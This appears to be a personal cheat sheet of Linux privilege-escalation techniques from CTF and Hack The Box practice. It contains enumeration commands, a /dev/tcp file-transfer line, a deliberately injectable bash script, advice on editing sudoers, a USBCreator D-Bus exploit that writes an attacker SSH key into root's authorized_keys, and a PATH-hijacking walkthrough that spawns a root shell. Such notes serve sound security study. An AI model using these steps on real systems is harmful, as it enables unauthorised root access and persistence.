# Linux
Everything to check when trying to become root


# Commands
## Basic info
- `sudo -l`
- `ps aux | grep <user>`
- `w` --> Displays each logged in user and shows their activity
- `groups` --> Shows all the groups that a user is in. *(Check for unusual groups)*
- `(env || set) 2>/dev/null` --> Shows environment variables

## Directories and files
- `ls - ltrh` --> sort files by latest update (the one that is close to you by date, could be important)
- `find / -writable -type d 2>/dev/null`
- `find / -perm -4000 2>/dev/null`

## Network
- `(netstat -punta || ss --ntpu)` --> Open ports

## Misc
- `kill -9 <pid>`
- `cat /sys/class/graphics/fb0/virtual_size` --> Shows the screen resolution.
- `blkid` --> Determines the type of content (e.g. filesystem, swap) a block device holds.
    - Check [this](https://linux.die.net/man/8/blkid) link for more.
- [`debugfs`](./linux.md#debugfs)
- `ltrace`

*Check out [this script](https://gist.github.com/IVBecy/fa31bb1e268b7709b79764614a97a79f) for ease of use*

# Directories
- ~/
- ~/.ssh
- /tmp
- /dev/shm
- /opt
- /var
- /usr
- /etc/apache2 *(if a site is live)*
    - /etc/apache2/site-enabled

# Useful linux programs,tools and commands
- `jq`` --> Makes json data readable   
    ```bash
    cat <json_file> | jq
    ```
- `cat /proc/net/fib_trie` --> Shows network topology
- `hostname` --> Shows domain name
- `/etc/os-release` --> OS info and release
- `cat <file> /dev/tcp/<ip>/<port>` --> Download file from shell session


# Analysis tools
- LinPeas
- pspy64
- [GTFOBins](https://gtfobins.github.io/) (online)


# DIR / file copy (symlink)
If there's a DIR or a file that is being copied one can either create a symlink or a direct spoof of the actual file so that the copied item will be spoofed and have the data the attacker wants.


# Bash file command execute
If a file executes any variable, one might be able to write payload to it.

## Example
```bash
#!/bin/bash

echo -e "Input:\t"
read myvar

/bin/bash -c $myvar
```
Note: Here one can insert malicious code to be executed by the program.



# Binaries (file read and write)
- If a gven binary allows you to edit files and one's not yet root, the attacker can try to edit the **sudoers** file and put the user in there, hence gaining root privs.      
- Also, maybe try copying the original file and add yourself to it and replace the original file with the altered version.



# Processes / Buses

## Monitor buses
`busctl` can be used to monitor and examine the D-Bus.

## Vulnerable interfaces

### USBCreator D-Bus | com.ubuntu.USBCreator
#### Steps to exploit
```bash

remote-machine> ps auwx | grep usb

remote-machine> echo "attack-machine id_rsa.pub key" > ~/authorized_keys

remote-machine> gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/remote/authorized_keys /root/.ssh/authorized_keys true

attack-machine> ssh -i id_rsa root@10.10.10.10
```
Help: [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)


# Web technologies
Below you'll find a list of vulnerabilities in web technologies that will allow one to escalate privileges on a machine.

- [Redis - CVE-2022-0543](../Known_vulnerabilities/web.md#redis-lua-sandbox-escape-vulnerability-cve-2022-0543)
- [Flask (Jinja 2) RCE](../Known_vulnerabilities/web.md#flask-jinja-2-rce)


# Raw image file to actual image
A raw image data can be converted to an actual image to reveal its content.
## Gimp
1. Select the file and its type (Raw image data)
2. Select resolution (`cat /sys/class/graphics/fb0/virtual_size` if unknown)
3. Edit image types
4. Export as png

# User in disk group
A user who is in the disk group, will probably have access to info on a given disk.

## debugfs
`debugfs` let's you debug a file system if you can read the device.       
With this, one can read files owned by a given user

### Help
- [https://man7.org/linux/man-pages/man8/debugfs.8.html](https://man7.org/linux/man-pages/man8/debugfs.8.html)

# Path hijacking and ltrace
If there's a program that can be run by the user but is owned by root check for the following:    

Run the program with `ltrace` see if something fails, or if it's trying to access files which the user has no access to.

If the program opens a file based on the `PATH` environment variable, check if it can be modified.
If it can be, move into a directory which the user can operate under and add it to `$PATH`

## Example (from pandora HTB)
This example can be modified and used for other cases.

- Find the vulnerability
    ```bash
    # Run program with ltrace
    ltrace program

    ## Look for permission errors
    ### No access to /root/file
    system("tar -cvf /root/file"...tar: /root/file.tar.gz: Cannot open: Permission denied
    ```
    `system` calls tar without full path, therefore it will use PATH to look for valid files.

- Find a good directory and edit $PATH
    ```bash
    export PATH=<DIR>:$PATH
    ```

- Add file 
    ```bash
    # Make tar file in <DIR> folder specified above
    vim tar

    # In vim

    #!/bin/bash
    bash
    ```
Once the original program executes in the directory, it will run our tar program and spawn a root shell.


